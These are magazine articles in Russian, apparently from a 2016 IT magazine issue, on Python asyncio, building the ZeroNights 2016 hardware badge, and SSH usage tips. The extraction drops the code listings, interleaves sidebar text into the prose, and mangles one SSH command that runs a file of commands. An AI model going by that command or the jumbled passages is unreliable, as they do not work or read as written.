ЦИКЛ ПЕРЕДАЧ НА ТРЕТЬЕМ КАНАЛЕ
 16 марта 2014 года произошло событие, которое привело к довольно бодрым
 холиварам, — вышел Python 3.4, а вместе с ним и своя внутренняя реализация
 event loop’а, которую окрестили asyncio. Идея у этой штуки была ровно такая,
 как я написал во введении: вместо того чтобы зависеть от внешних сишных
 реализаций отлова неблокирующих событий на сокетах (у gevent — libevent,
 у Tornado — IOLoop и так далее), почему бы не встроить одну в сам язык?
   Сказано — сделано. Теперь бывалые душители змей вместо того, чтобы
 в качестве ответа на набивший оскомину вопрос «Что такое корутина?» нырять
 в генераторы и метод .send(), могли ткнуть в красивый декоратор @asyncio.
 coroutine и отправить вопрошающего читать документацию по нему.
   Правда, сами разработчики отнеслись к новой спецификации довольно
 неоднозначно и с опаской. Хоть код и старался быть максимально совмести-
мым по синтаксису со второй версией языка — проект tulip, который как раз
 был первой реализацией PEP 3156 и лег в основу asyncio, был даже в каком-то
 виде бэкпортирован на устаревшую (да-да, я теперь ее буду называть только
 так) двойку.
   Дело было еще и в том, что реализация, при всей ее красоте и привержен-
 ности дзену питона, получилась довольно неторопливая. Разогнанные gevent
 и Tornado все равно оказывались на многих задачах быстрее. Хотя, раз уж
 в народ в комьюнити настаивал на тюльпанах, в Tornado таки запилили экс-
 периментальную поддержку asyncio вместо IOLoop, пусть она и была в разы
 медленнее. Но нашлось у новой реализации и преимущество — стабильность.
 Пусть соединения обрабатывались дольше, зато ответа в итоге дожидалась
 бОльшая доля клиентов, чем на многих других прославленных фреймворках.
 Да и ядро при этом, как ни странно, нагружалось чуть меньше.
   Старт был дан, да и какой старт! Проекты на основе нового event loop’а на-
 чали возникать, как грибы после дождя, — обвязки для клиентов к базам дан-
 ных, реализации различных протоколов, тысячи их! Появился даже сайт http://
 asyncio.org/, который собирал список всех этих проектов. Пусть даже этот сайт
 не открывался на момент написания статьи из-за ошибки DNS — можешь по-
 верить на слово, там интересно. Надеюсь, он еще поднимется.
   Но не все сразу заметили, что над новой версией Python завис великий
 и ужасный PEP 492...

СЕГОДНЯ В СОПРОГРАММЕ
 Так уж получилось, что довольно большое число людей изначально не до кон-
 ца поняло смысл введения asyncio и считало его чем-то наподобие gevent,
 то есть сетевым или даже веб-фреймворком. Но суть у него была совсем
 другая — он открывал новые возможности асинхронного программирования
 в ядре языка.
   Ты же помнишь в общих чертах, что такое генераторы и корутины (они же
 сопрограммы)? В контексте Python можно привести два определения генера-
 торов, которые друг друга дополняют:
 1. Генераторы — это объекты, предоставляющие интерфейс итератора,
    то есть запоминающие точку последнего останова, которые при каждом об-
   ращении к следующему элементу запускают какой-то ленивый код для его
   вычисления.
 2. Генераторы — это функции, имеющие несколько точек входа и выхода, за-
   данных с использованием оператора переключения контекста yield.

 Корутины же всегда определялись как генераторы, которые, помимо того
 что вычисляли значения на каждом этапе, могли принимать на каждом обра-
 щении параметры, используемые для расчетов следующей итерации. По сути,
 это и есть вычислительные единицы в контексте того, что называют коопера-
 тивной многозадачностью, — можно сделать много таких легковесных кору-
 тин, которые будут очень быстро передавать друг другу управление.
   В случае сетевого программирования именно это и позволяет нам быстро
 опрашивать события на сокете, обслуживая тысячи клиентов сразу. Ну или,
 в общем случае, мы можем написать асинхронный драйвер для любого I/O-у-
 стройства, будь то файловая система на block device или, скажем, воткнутая
 в USB Arduino.
    Да, в ядре Python есть пара библиотек, которые изначально предназнача-
 лись для похожих целей, — это asyncore и asynchat, но они были, по сути, экс-
 периментальной оберткой над сетевыми сокетами, и код для них написан до-
 вольно давно. Если ты сейчас, в конце 2016 года, читаешь эту статью — значит,
 настало время записать их в музейные экспонаты, потому что asyncio лучше.
   Давай забудем на время про несвежий Python 2 и взглянем на реализацию
 простейшего асинхронного эхо-сервера в Python 3.4:





 Нам ничто не мешает подключиться к этому серверу несколькими клиентами
 и отвечать всем сразу. Это можно проверить, например, с помощью netcat.
 При этом на сокете будет использоваться лучшая реализация поллинга собы-
 тий из доступных в системе, в современном Linux это, разумеется, epoll.
    Да, этот код асинхронный, но callback hell — тоже вещь довольно неприят-
 ная. Немного неудобно описывать асинхронные обработчики как гроздья ви-
 сящих друг на друге колбэков, не находишь? Отсюда и проистекает тот самый
 классический вопрос: как же нам, кабанам, писать асинхронный код, который
 не был бы похож на спагетти, а просто выглядел бы несложно и императив-
 но? На этом месте передай привет в камеру ноутбука (если она у тебя не за-
 клеена по совету ][) тем, кто активно использует Twisted или, скажем, пишет
 на JavaScript, и поехали дальше.
   А теперь давай возьмем Python 3.5 (давно пора) и напишем все на нем.





 Красиво? Никаких классов, просто цикл, в котором мы принимаем подключе-
 ния и работаем с ними. Если этот код сейчас взорвал тебе мозг, то не волнуй-
 ся, мы рассмотрим основы этого подхода.


 Для создания подобных серверов и вообще красивой асинхронной работы
 в Python Дэвид Бизли (обожаю этого парня) написал свою собственную би-
 блиотеку под названием curio. Крайне рекомендую ознакомиться, библиоте-
 ка экспериментальная, но очень приятная. Например, код TCP-сервера на ней
 может выглядеть так:





 Несложно заметить, что в случае асинхронного программирования подобным
 образом в питоне все будет крутиться (каламбур) вокруг того самого внутрен-
 него IOLoop’а, который будет связывать события с их обработчиками. Одной
 из основных проблем, как я уже говорил, остается скорость — связка Python
 2 + gevent, которая использует крайне быстрый libev, по производительности
 показывает гораздо лучшие результаты.
   Но зачем держаться за прошлое? Во-первых, есть curio (см. врезку),
 а во-вторых, уже есть еще одна, гораздо более скоростная реализация event
 loop’а, написанная как подключаемый плагин для asyncio, — uvloop, основан-
 ный на адски быстром libuv.
    Что, уже чувствуешь ураганный ветер из монитора?

ТЕТЯ АСЯ МОЖЕТ ВСЕ
 Итак, что же мы имеем? Мы имеем асинхронные функции, они же корутины.
 Вот такие:



 Если мы просто так возьмем и вызовем эту функцию, ничего не произойдет,
 потому что нам вернется ленивая корутина. Но мы же помним из статей о ге-
 нераторах, что нам нужно сделать, чтобы ее запустить? Правильно — передать
 ей контекст через оператор yield. Формально этого yield’а у нее нет, но мы мо-
 жем послать в нее значение для того, чтобы «промотать» корутину до следую-
 щего переключения контекста:





 Что-то знакомое, да? Генератор исчерпался и выкинул StopIteration. Мож-
 но, конечно, написать обработчик исключения и дергать корутины через него,
 но это будет выглядеть крайне странно. Но! Мы можем очень легко вызвать эту
 корутину из другой корутины!



 Да, мы ее просто «подождем», как маму из той самой песни. Таким образом
 мы можем выстроить целый разветвленный граф из корутин, которые «ожида-
 ют» друг друга и передают управление туда и обратно. Если ты сейчас вскочил
 с кресла и воскликнул: «Да это же кооперативная многозадачность!» — моло-
 дец, к этому все и шло.
    Кстати, если все равно назло маме вызвать функцию без await внутри ко-
 рутины, то нам не просто вернется coroutine object, но еще и в консоль упадет
 большой warning и напоминание coroutine ‘blablabla’ was never awaited. Ее ни-
 кто не дождался, поэтому она обиделась и не стала исполняться. Но такие со-
 общения очень помогают в отладке.
   А еще — нельзя просто так взять и вызвать await в интерактивном REPL’е,
 потому что он не является корутиной сам по себе:





В остальных случаях await можно писать где угодно внутри корутины, за ис-
 ключением списковых включений (они же list comprehensions, и это обещают
 добавить в ближайших релизах) и лямбд (потому что они сами не корутины).
 А async можно использовать, например, для методов в классе (за исключени-
 ем «приватных» __методов__, которые могут дергаться самим Python’ом, по-
 нятия не имеющим, что у вас там корутина).
   Давай напишем, как нам теперь реально запустить всю эту катавасию:





 Все довольно просто: мы достаем event loop и заставляем корутину запустить-
 ся в нем. Много кода, скажешь? Не особо на самом деле, особенно с учетом
 того, какие преимущества это нам дает.

БЛИЖЕ К ЖИЗНИ
 Я мог бы рассказать еще про такие штуки, как async for и async with:
 •  первое — это просто итерация по объекту с ожиданием корутины на каждом
   шаге, объект должен иметь интерфейсные методы __aiter__ и __anext__;
 •  второе — управление контекстом через вызовы корутин — необходимые
   методы, соответственно, __aenter__ и __aexit__.

 Но лучше почитай про всякую глубинную магию по ссылкам во врезке, а сей-
 час давай обратимся к более практическому примеру.

We need to go deeper (c)

Еще пара трюков

 Отличная презентация по экосистеме и возможностям

 Шикарный пост на тему подхода в целом, а не конкретно про Python



 Есть банальная, казалось бы, задача, которая практически нереализуема
 во втором питоне, — запустить подпроцесс и асинхронно читать его вывод
 по мере поступления, как, собственно, и должен работать PIPE.
   В последнее время я сильно разочаровался во встроенном модуле
 subprocess, но к нам на помощь спешит асинхронная реализация, на данный
 момент часть asyncio. И там это делается просто и красиво.





 Пример  нагло  стырен отсюда  с небольшими модификациями,  потому
 что он простой и красивый.


 Да, это много кода. Но он должен казаться гораздо более понятным после
 объяснений выше, да и вообще он довольно легко читается. Я, честно сказать,
 искренне надеюсь, что именно возможности наподобие описанных позво-
 лят наконец большему количеству народа распробовать Python 3.5 и перейти
 на него окончательно.

СУХОЙ ОСТАТОК
 Зачем все это нужно? Затем, что слишком много программ рано или поздно
 упираются в блокировки — когда мы читаем из сокета, когда мы ждем вывод
 от процесса, когда мы ждем сигнал от устройства и т. д. и т. п. Обычно такие
 вещи делаются, например, бесконечным циклом — мы будем стучаться, пока
 не появятся новые данные нам для обработки, а потом условие выполнится
 и запустится какой-то код.
    Так вот, зачем так делать, если мы можем попросить систему саму отпра-
 вить нам из kernel space (и опять все дружно скажем «Ave epoll!») сообщение
 о том, что у нас есть новые данные? Не тратя вычислительные ресурсы на не-
 нужный код.
   Я думаю, всем любителям питона стоит исследовать этот новый мир, ко-
 торый нам стал доступен совсем недавно и теперь активно развивается. Нам
 больше не надо патчить модуль socket через gevent и терпеть адские баги.
 У нас уже есть готовые асинхронные библиотеки для работы с базами данных
 (например, aiopg), протоколами (aiozmq), сторонними сервисами через API
 (aiobotocore) и написания скоростных серверов (aiohttp).
   Мало ссылок? Ладно, вот еще одна: реализация протокола HTTP2, которую
 можно гонять хоть на потоках, хоть на корутинах, — очень интересный проект
 hyper-h2.
    Так чего ты еще тут сидишь? Иди пиши код! Удачи!
КОДИНГ/ФРИКИНГ
ХАРДВАРНЫЙ
БЕЙДЖИК
ZERONIGHTS
2016КАК МЫ ДЕЛАЛИ
ЗНАМЕНИТУЮ
МАТРЕШКУ





В этой статье я расскажу всего об одном, но зато интерес-
ном аспекте нашей подготовки к ZeroNights 2016, на кото-
рой ты наверняка присутствовал в ноябре прошлого года.
Ну или не присутствовал, зато знаешь того, кто присут-
ствовал. Так, погоди, ну хотя бы в нашем журнале ты о ней
читал? :) Если хотя бы на один из вопросов ты ответил «да»,
то ты знаешь, что одной из фишек этой конференции был
наш прикольный техногенный бейджик-матрешка. И сде-
лан он был не из бархатной бумаги и даже не из листового
палладия, а из... впрочем, об этом — ниже.


По хештегу #zeronights в твиттере можно найти то, что энтузиасты уже сделали
на основе этого бейджика :).



ЗАРОЖДЕНИЕ СИЛЫ. ТО ЕСТЬ ИДЕИ
Идея сделать «прикольный бейджик» посетила нас в один из летних деньков
теперь уже безвозвратно прошедшего года. Немного пораскинув мозгами, мы
уточнили: «ну, прикольный бейджик для технарей» — и сформулировали ко-
е-какие требования. Вот они:
•  чтобы было прикольно и чтобы для айтишников (кажется, я повторяюсь);
•  чтобы красиво смотрелось в нашей символике;
•  чтобы было интуитивно понятно, как этим пользоваться;
•  максимально бюджетно при изготовлении;
•  можно сделать быстро. Как и полагается всем порядочным хакерам, подго-
   товку мы немного затянули и поэтому действовать вынуждены были в атмос-
  фере легкого аврала :).

Наш личный top магазинов электронных компонентов

Все, кто в конце девяностых играл в компьютерную игру Arcanum, знают,
что электронные и механические компоненты можно найти даже на помойке,
а при покупке в лавках они стоят достаточно дешево. Реальная жизнь и прак-
тика электронщика вносят в эти знания свои коррективы, поэтому я предлагаю
тебе приобщиться к нашему опыту посещения магазинов электроники :).
1. Как ни странно, «Чип и Дип». Раньше это был дорогой магазин, но сейчас
   либо остальные подняли цены, либо ЧиД их снизил. На некоторые компо-
   ненты цены в хорошем смысле впечатляют.
2. Микроника. Много рассыпухи, но очень плохой сайт для поиска.
3. Терраэлектроника. Крепкий середнячок, советую заглянуть.
4. Пятый элемент. Огромный выбор всего и вся. Является представителем
   Farnell (а это уже глобальный дистрибьютор в мире электронных компо-
   нентов). Есть у него и подводные камни: проблемы со штучной доставкой
   и большие сроки ожидания (месяц, а то и больше).


«Сердцем» бейджика должен был стать микроконтроллер, и для его более
стабильной работы нужен кварц. Кварц мы взяли обычный, громоздкий, двух-
выводной. Возможно, кто-то скажет, что можно было найти более компакт-
ный кварц, но за компактность пришлось бы платить дополнительно, а вопрос
бюджета стоял перед нами достаточно остро. Кроме того, мы планировали
сначала изготовить тестовый образец (несколько плат), спаять их, проверить,
что все работает, и уже потом заказывать большую партию. Паять мелкие де-
тали вручную гораздо сложнее, чем крупные. Скромно хвастаясь, сообщу,
что среди моих коллег нашелся джедай, который смог с первого раза запаять
светодиод LED 1, типоразмер 0603 (для справки: типоразмер 0603 — это 1,6
мм в длину и 0,85 мм в ширину). По этим же причинам большая часть резисто-
ров и конденсаторов выбирались максимально крупные (в основном это ти-
поразмер 1206). Контактные площадки XX1 и XX2 брали с шагом 2,54 мм, так
как это одно из стандартных расстояний между пинами в различных гребенках.
Дальше будет показана 3D-модель получившейся платы, где читатель сможет
увидеть названия LED, XX1, XX2.
  За основу мы выбрали Teensy 2.0. Полную информацию о проекте ты узна-
ешь по ссылке, а здесь я лишь уточню, что изначально это были небольшие
Development Board, основанные на микроконтроллерах фирмы Atmel. Послед-
ние версии используют уже ARM-ядро Cortex-M4F и линейку микроконтролле-
ров Kinetis компании NXP.


Конечно, проще всего было бы закупить необходимое количество уже готовых
платок и их раздавать. Но нам хотелось сделать что-то свое, прикольное и не-
обычное, и обязательно в форме матрешки!



ПРОЕКТИРУЕМ ПЛАТУ
Идея наконец стала обретать формы проекта. Первое, что необходимо было
сделать, — спроектировать плату матрешки и ее изготовить. Для разработ-
ки платы мы использовали AltiumDesigner. Иногда можно встретить сокраще-
ние AD, и у некоторых разработчиков эта аббревиатура вызывает ассоциации
не с ActiveDirectory, а кое с чем подземным :). Почему мы не воспользовались
более простыми аналогами? Причин несколько, и среди них есть субъективные:
•  Когда-то давно у меня был опыт работы в P-CAD (до-
   статочно неплохая IDE для проектирования плат).
•  Хотелось изучить что-то новое, а, по моему мнению,
  AD — один из самых профессиональных инструмен-
   тов в этой области (нисколько не принижаю достоинств
   других CAD-систем для создания электрических схем
                                   WWW
   и проектирования печатных плат, например EAGLE,
   EasyEDA, Sprint-Layout или то, в чем работаешь ты, ува-       Если ты хочешь
  жаемый читатель).                                                       заняться про-
                                                                        граммированием• AD позволяет проектировать плату, расставляя 3D-эле-                                                                            микроконтроллеров,
   менты. Мне как новичку это порой очень помогало из-      проектированием
   бежать некоторых ляпов. 3D-модели можно рисовать     печатных плат и про-
                                                                      чими «низкоуровне-   в SolidWorks или другой удобной для тебя САПР, а так-                                                                       выми» железками,
  же можно воспользоваться готовыми моделями с сайта                                                                      рекомендую сайт.
   www.3dcontentcentral.com.                                    На нем размещено
                                                                            очень много дельных
                                                                       и полезных, причем
В итоге после пары дней рисования и пыхтения получи-                                                                          написанных доступ-
лась вот такая 3D-модель:                                     ным языком статей.





                                                       Крутая матрешка





ПОДВОДНЫЕ КАМНИ ПРОЕКТИРОВЩИКА
Как может заметить наблюдательный читатель, кнопки SW1, вернее ее 3D-мо-
дели, к сожалению, на том сайте не нашлось. Размеры матрешки получились
108 мм по высоте и 62,5 мм по ширине.
   Когда я начинал рисовать схему, а точнее располагать элементы на плате,
думал, что все будет просто: плата выходила «большой», а элементов и доро-
жек не так много. Забегая немного вперед, скажу, что я ошибался ;). Вот с ка-
кими подводными камнями я столкнулся:
•  Оказалось, часть платы нельзя использовать, потому что приведенные из-
   мерения сделаны в самых широких ее частях.
• По фэншую для более стабильной работы микроконтроллера желательно
   исключить пролегание дорожек под ним.
•  Кварц нужно располагать как можно ближе к микроконтроллеру, да еще
   и оградить его контурами земли (кстати, пара неплохих заметок о том,
   как проектировать помехоустойчивые устройства).

После всех моих казавшихся успешными стараний я запустил автотрассировку
дорожек в AD, а тот, в свою очередь, немного подумав, показал мне несколько
десятков психоделических картинок и выдал сообщение, смысл которого сво-
дился к тому, что работа сделана, все ОK, но пару дорожек проложить не мо-
жет. Пришлось удалять несколько дорожек и ручками разводить оставшиеся.
   Итак, схема нарисована и разведена, 3D-модель будущего бейджика есть,
все нравится — пора из картинки превращать это в готовое изделие.

ВОПЛОЩАЕМ В ЖЕЛЕЗЕ
Поскольку опыта изготовления железок у нас было мало, мы решили сделать
пару плат и своими силами произвести монтаж. И если все заработает и за-
пустится, то уже заказывать серию в «Резоните» (для этого необходимо пе-
реслать им gerber-файлы. AD прекрасно справляется с этой задачей. На сай-
те «Резонита» есть даже инструкции, как получить gerber-файлы из разных
САПР).
   Как показала практика, нельзя сказать, что заказывать изготовление плат
в РФ сильно дороже, чем в Китае (во всяком случае, так говорят различные
калькуляторы расчета стоимости производства плат). При заказе в «Резони-
те» конечная стоимость складывается из «подготовки производства» (фикси-
рованная величина, зависит от размеров платы, типа платы, толщины дорожек
и еще нескольких параметров) и количества плат, которые надо произвести.
И может оказаться, что заказ десяти плат выйдет чуть дешевле семи-восьми.
   Итак, сформировали заказ, оплатили и дней через пятнадцать мы получили
первую пробную партию бейджиков :).

КОВЫРЯЕМ ЖЕЛЕЗО
Как я уже говорил, у нас есть джедай паяльника, который смог все аккуратно
запаять. Так что была возможность проверить, все ли правильно.
   Подключаем к компу, открываем Arduino IDE, выбираем Teensy 2.0... Бара-
банная дробь... результат — нет подключения, плата не обнаружена.
   «Все пропало, шеф!» — такова была первая реакция. Что, как, почему?!
Что не так припаяли, где ошибка в схеме, может быть, уже что-то пожгли?
   Так, спокойно. Чашка кофе, глубокий вдох и неспешное размышление, про-
звонка дорожек...
  Мы взяли за основу схемотехнику Teensy 2.0; дорожки у нас прозванивают-
ся как надо, значит, нет замыканий; мультиметр показывает честные 5 В пита-
ния, осциллограф рапортует о том, что кварц выдает положенные 16 МГц. Ми-
кроконтроллер мы покупали в ЧиД. И тут приходит мысль и понимание, что это
не Teensy 2.0 в чистом виде со своим уже прошитым бутлоадером и возмож-
ностью программировать ее из Arduino IDE!
  В итоге поиск и чтение форумов привели нас к программе FLIP, которая по-
зволяет заливать прошивку через USB. Подключаем матрешку, открываем эту
программу. Микроконтроллер видится в системе, готов к прошивке. Заливаем
тестовую программу, задача которой — поморгать диодом, перезагружаемся,
затаив дыхание... и ура, диод моргает! Плата сконструирована верно, спаяна
правильно, и все работает, можно заказывать партию!
   Совет юным разработчикам: если ты спроектировал плату, то прежде, чем
ее отправлять в производство, закупи с запасом все детали, которые будут
использоваться при ее монтаже. Это убережет тебя от неприятной ситуации,
когда плата будет готова, а каких-то деталей не окажется, так как они сняты
с производства или больше не поставляются.
  И еще совет: если тебе кажется, что ты все спроектируешь за неделю, луч-
ше закладывать раза в два больше времени :). Не забывай про отладку и воз-
можный поиск ошибок, а может еще и производство немного напортачить,
как было в нашем случае. Тестовые образцы у нас были красивого синего цве-
та. А партия получилась как бы синего цвета, но с уходом в зеленый. В итоге
цвет вышел какой-то бледно-сине-зеленый, и смотрелось уже не так красиво.
И самое главное, начинали поджимать сроки. В итоге «Резонит» переделы-
вал матрешки заново. Были все шансы, что не получится привезти хардварные
бейджики на конференцию. Но нам повезло: за пару дней до отъезда матреш-
ки были изготовлены и доставлены в офис.

ЧТО У НАС ПОЛУЧИЛОСЬ И КАК ЭТО ИСПОЛЬЗОВАТЬ?
Если отбросить лирику, то это полноценная отладочная плата, у которой вы-
ведены все «ноги» микроконтроллера на две контактные площадки XX1 и XX2.
В качестве микроконтроллера используется ATmega32U4. Питание либо через
microUSB, либо через контактные площадки Vcc и GND. Как уже было сказа-
но, прошивку можно заливать в микроконтроллер через microUSB с помощью
программы FLIP. А саму программу можно писать в Atmel Studio (бывшая AVR
Studio). Распространяется она бесплатно.
   Что еще можно добавить об Arduino/Teensy и получившемся бейджике?
Эти проекты позволяют юным разработчикам сразу начать реализовывать ка-
кие-то свои задумки. У них в распоряжении оказывается готовая простая сре-
да разработки (ArduinoIDE). Но за эту простоту приходится платить тем,
что очень многие вещи скрываются от программиста; если использовать скетч
(так называется программа для Arduino), то порой хромает быстродействие.
Вот наш бейджик заставляет разработчика копнуть чуть глубже. Возможно,
ему придется почитать даташит на микроконтроллер, лучше изучить язык про-
граммирования С, познакомиться с внутренним миром самого микроконтрол-
лера и семейства целиком. Поначалу это может показаться трудным, но стра-
дания окупятся: ты сможешь писать более гибкие программы, ты станешь
на несколько ступенек выше в табели о рангах профессиональных разработ-
чиков встроенных систем.

ЗАКЛЮЧЕНИЕ
В качестве небольшого итога этой статьи еще пара со-
ветов и размышлений о разработке.
•  Рекомендую делать различные тестовые площадки
   и пины на этапе производства прототипа. Это нужно     WWW
   для того, чтобы у тебя была возможность легко под-                                                                       Без комментариев.
   ключиться к ним осциллографом, логическим анали-          Читай всё :)
   затором или мультиметром, чтобы посмотреть «физи-
                                                                                       microsin.net/adminstuff/   ку» процесса и понять, где закралась ошибка. Очень                                                                                       others/altium-designer-
   облегчает жизнь :).                                                                                       howto.html
•  Если ты решил что-то запитывать от USB ноутбука или
   компьютера, не пожалей денег на такую замечатель-      sapr-journal.ru/category/
                                                                                                 uroki-altium/   ную вещь, как термопредохранитель (пример (pdf)).
   Такие штуки должны будут защитить USB порт от вы-       techdocs.altium.com/
   горания, если что-то пойдет не так.                          display/AMSE/SPICE+Mo
                                                                             del+Creation+from+User•  Если решишь использовать какой-нибудь микро-                                                                               +Data
   контроллер для реализации своей идеи, не пожалей
   денег и на опытном образце поставь хотя бы один       wiki.altium.com/display/
                                                                         RUPROD/Altium+Designer   светодиод и простую кнопку. Позволит отлаживать
   огромное количество алгоритмов в случае, если нет                                                                                    www.gaw.ru/html.cgi/txt/
   других инструментов (JTAG-отладчика или логическо-     app/micros/mb90/pcb.htm
   го анализатора).
UNIXOID
  SSH
  TIPS’N’TRICKS
            20 СОВЕТОВ
      ПО ИСПОЛЬЗОВАНИЮ SSH
         НА ВСЕ СЛУЧАИ ЖИЗНИ





                                          Евгений Зобнин
                                                  zobnin@gmail.com

SSH — едва ли не самый распространенный инструмент
системного администратора. Каждый день тысячи людей
используют SSH для подключения к серверам, домаш-
ним машинам, роутерам и даже смартфонам. SSH-клиен-
ты есть для всех сколько-нибудь популярных платформ,
а сервер SSH встраивают даже в умные лампочки. Но го-
тов ли ты сказать, что на самом деле знаешь обо всех воз-
можностях SSH?


Свободная реализация протокола SSH, названная OpenSSH, была выпущена
разработчиками OpenBSD еще в 1999 году. И сегодня это де-факто стандарт
безопасного и удобного подключения к удаленной консоли. Спустя семнадцать
лет разработки в OpenSSH появилось огромное количество возможностей, на-
строек и режимов работы, о которых знают далеко не все пользователи.
   Эта статья — своего рода сборник быстрых рецептов, который ты мо-
жешь заучить или использовать как шпаргалку. Команды приведены для Linux,
но большинство из них будут работать и в любой другой ОС, для которой
есть сборка OpenSSH. Удаленный юзер и хост в тексте всегда обозначаются
как user@host, а по отдельности как <user> и <host>. Приятного чтения.

1. ЗАПУСКАЙ КОМАНДЫ БЫСТРО
Чтобы выполнить всего одну удаленную команду, совсем не обязательно под-
ключаться к SSH, вводить команду, а затем отключаться. Можно сделать это
сразу. Например, так можно посмотреть заполненность ФС удаленной машины:

$ ssh user@host df -h

А так — перезагрузить ее:

$ ssh user@host sudo reboot


2. СОСТАВЛЯЙ СПИСКИ КОМАНД И ЗАПУСКАЙ ИХ РАЗОМ
Если у тебя есть целый список команд, которые следует выполнить, их можно
записать в файл и скормить этот файл SSH:

$ ssh user@host "'cat file.txt'"


3. РЕДАКТИРУЙ УДАЛЕННЫЕ ФАЙЛЫ ЛОКАЛЬНЫМ РЕДАКТОРОМ
Чтобы отредактировать файл на удаленной машине, не требуется заходить
на нее и использовать консольный редактор. На самом деле файл можно от-
крыть в твоем любимом текстовом редакторе на локальной машине (gvim за-
меняем на свой редактор):

$ gvim scp://user@host//путь/к/файлу


4. КОПИРУЙ СОДЕРЖИМОЕ УДАЛЕННОГО ФАЙЛА
В БУФЕР ОБМЕНА
Если необходимо скопировать содержимое удаленного файла или вывод ко-
манды в буфер обмена, не обязательно выводить его на экран или открывать
в текстовом редакторе и копировать вручную. Можно использовать следую-
щую команду:

$ ssh user@host cat /путь/к/файлу | xclip

А так можно скопировать вывод команды:

$ ssh user@host uname -a | xclip


5. СРАВНИВАЙ УДАЛЕННЫЙ И ЛОКАЛЬНЫЙ ФАЙЛ
БЕЗ КОПИРОВАНИЯ
Похожий прием можно использовать для сравнения двух файлов:

$ ssh user@host cat /путь/к/удаленному/файлу | diff /путь/к/
    локальному/файлу -


6. РАБОТАЙ С УДАЛЕННЫМИ ФАЙЛАМИ
С ПОМОЩЬЮ ЛОКАЛЬНОГО ФАЙЛОВОГО МЕНЕДЖЕРА
Не всегда удобно работать с большим количеством файлов с помощью кон-
сольных команд или mc, запущенного на удаленной машине. Но всегда можно
подключить любой каталог удаленной машины как сетевой диск. Для этого до-
статочно установить sshfs:

$ sudo apt-get install sshfs

Создать каталог для подключения «сетевого диска»:

$ mkdir remote_files

И подключить его:

$ sshfs user@host:/home/user ~/remote_files/

Теперь все файлы удаленного каталога /home/user будут видны в каталоге
~/remote_files/ и с ними можно работать, как с обычными.

7. ИСПОЛЬЗУЙ TMUX
Сложные действия на удаленной машине редко ограничиваются одной консо-
лью. Обычно мы открываем сразу несколько SSH-соединений, в которых запу-
скаем различные команды, копируем текст из одной в другую, одновременно
следим за выполнением нескольких операций. Однако держать открытыми не-
сколько сессий совсем не обязательно, хватит и одной, в которой запущен tmux.
   Утилита tmux — еще одно детище команды OpenBSD. Она позволяет запу-
стить внутри одной SSH-сессии неограниченное количество консолей, с кото-
рыми можно работать одновременно, в том числе сразу с несколькими на од-
ном экране. Но самое главное — tmux поддерживает функцию detach/attach,
позволяющую отключиться от текущей сессии tmux, закрыть SSH-соедине-
ние, подключиться к машине уже с другого компа и возобновить сессию tmux
со всеми открытыми консолями и их содержимым.





                                           Tmux в режиме разделения экрана

Tmux доступна в репозиториях почти всех популярных дистрибутивов. Устанав-
ливать и запускать ее следует на удаленной машине, но перед тем как начать
использовать, придется прочитать документацию (или шпаргалку).

8. КОПИРУЙ КЛЮЧИ БЫСТРО
Хоть и копирование публичного ключа на удаленный сервер — задача простая,
но она требует выполнения нескольких действий вручную. Если тебя это на-
прягает, скопировать ключ можно в автоматическом режиме:

$ ssh-copy-id user@host

При этом не обязательно копировать основной ключ, с помощью флага -i
можно указать любой другой:

$ ssh-copy-id -i ~/my_key.pub user@host





                                                             Копируем ключ


9. СОЗДАЙ ПОСТОЯННОЕ СОЕДИНЕНИЕ С МАШИНОЙ
Если в течение дня ты часто подключаешься к одной машине, в том числе
на несколько минут или секунд (чтобы просто запустить одну команду, напри-
мер), есть смысл создать с ней постоянное соединение. Твой комп будет дер-
жать соединение открытым и использовать его для каждого подключения к ма-
шине. Это намного быстрее и экономичнее с точки зрения трафика и нагрузки
на процессор.
   Добавь следующие строки в ~/.ssh/config:





А затем создай соединение:

$ ssh -MNf user@host


10. ИСПОЛЬЗУЙ СПЕЦИАЛЬНУЮ ВЕРСИЮ SSH ДЛЯ НЕУСТОЙ-
ЧИВЫХ СОЕДИНЕНИЙ
SSH не рассчитан на работу в условиях неустойчивого интернет-соединения,
поэтому не умеет адекватно реагировать на потерю пакетов. Фактически, если
соединение оборвется, SSH просто повиснет и будет находиться в таком со-
стоянии, пока не закончится тайм-аут. До тех пор пока ты используешь надеж-
ное оптоволоконное соединение, это не проблема, но как только попадаешь
в условия жесткой российской глубинки, где даже 3G может быть экзотикой,
SSH превратится в невыносимо тупой инструмент.
   Решить проблему можно с помощью autossh. Это обертка над SSH, которая
умеет проверять жизнеспособность канала. Autossh создает дополнительное
SSH-соединение с сервером и непрерывно шлет по нему heartbeat-пакеты.
Если пакет не доходит до адресата, autossh считает канал мертвым и переза-
пускает SSH-соединение.
   Пользоваться очень просто:

$ sudo apt-get install autossh
$ autossh -M5000 user@host

По умолчанию тайм-аут между посылкой heartbeat-пакетов составляет десять
минут, что слишком много. Для уменьшения тайм-аута пропиши его в пере-
менную AUTOSSH_POLL перед запуском autossh (значение в секундах):

$ export AUTOSSH_POLL=10

Есть вариант еще лучше: mosh. Это специально оптимизированная для неу-
стойчивых и низкоскоростных соединений версия SSH, работающая по про-
токолу UDP. Mosh позволяет получить быстрое и отзывчивое соединение даже
на очень медленном канале и из коробки умеет поднимать упавшее соеди-
нение и даже переключать клиента с одного IP на другой (при переключении
с Wi-Fi-соединения на мобильное, например) без перезапуска сессии.
   У mosh всего один недостаток: он требует установки не только на локаль-
ную машину, но и на удаленную. Зато после этого ничего настраивать не нуж-
но, достаточно использовать команду mosh вместо ssh. Более того, mosh уже
встроен в SSH-клиенты JuiceSSH для Android и Blink для iOS.

11. ОТКРЫВАЙ ПОРТ SSH, ТОЛЬКО КОГДА ОН НУЖЕН
Открытый SSH-порт твоего сервера рано или поздно станет целью многочис-
ленных ботов, которые будут бесконечно к нему подключаться и пытаться по-
добрать пароль, даже если ты отключил аутентификацию по паролю. Бороться
с ботами можно двумя способами: либо установить fail2ban и автоматически
отшибать особо надоедливых, либо открывать порт только тогда, когда это не-
обходимо.
   Если ты подключаешься к серверу нечасто, второй вариант практически
идеален. Идея в том, что на сервер устанавливается специальный демон,
который слушает указанные порты и в случае соединения с этими портами
в определенном порядке откроет 22-й порт. Другой порядок соединения бу-
дет закрывать порт.
   Техника называется port knoking и реализуется с помощью демона knockd.
Установи демон на сервер:

$ sudo apt-get install knockd

И настрой его, добавив в файл /etc/knockd.conf следующие строки:





Перезапусти демон:

$ sudo /etc/init.d/knockd restart

Теперь используй следующую команду для подключения к серверу:

$ knock <host> 3000 4000 5000 && ssh user@host && knock <host> 5000
4000 3000

